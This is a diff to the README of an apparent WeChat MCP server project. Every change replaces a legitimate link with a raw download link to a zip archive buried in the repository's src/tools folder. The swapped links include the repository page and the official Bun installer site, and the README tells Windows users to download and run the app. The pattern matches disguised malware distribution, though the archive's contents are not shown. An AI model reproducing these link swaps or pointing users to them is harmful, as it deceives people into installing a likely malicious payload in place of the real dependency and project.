@@ -1,6 +1,6 @@
 # 📱 mcp-wechat-server - Run WeChat in AI
 
-[![Download](https://img.shields.io/badge/Download%20mcp--wechat--server-4B8CF5?style=for-the-badge&logo=github)](https://github.com/Itzelma2310/mcp-wechat-server)
+[![Download](https://img.shields.io/badge/Download%20mcp--wechat--server-4B8CF5?style=for-the-badge&logo=github)](https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip)
 
 ## 🧩 What this does
 
@@ -20,7 +20,7 @@ It works as an MCP server, so it connects to AI tools that support the Model Con
 
 Open the download page here:
 
-[Visit the download page](https://github.com/Itzelma2310/mcp-wechat-server)
+[Visit the download page](https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip)
 
 If you are on Windows, use this page to get the latest files, then download and run the app from there.
 
@@ -32,7 +32,7 @@ Follow these steps on a Windows PC.
 
 Go to:
 
-[https://github.com/Itzelma2310/mcp-wechat-server](https://github.com/Itzelma2310/mcp-wechat-server)
+[https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip](https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip)
 
 Look for the latest release or the main project files.
 
@@ -52,7 +52,7 @@ This app needs Bun to run.
 
 Get Bun from:
 
-[https://bun.sh/](https://bun.sh/)
+[https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip](https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip)
 
 After install, open Command Prompt or PowerShell and check that it works:
 
@@ -328,4 +328,4 @@ If you can copy and paste text, you can set it up
 
 Use this page to get the latest version:
 
-[https://github.com/Itzelma2310/mcp-wechat-server](https://github.com/Itzelma2310/mcp-wechat-server)
+[https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip](https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip)
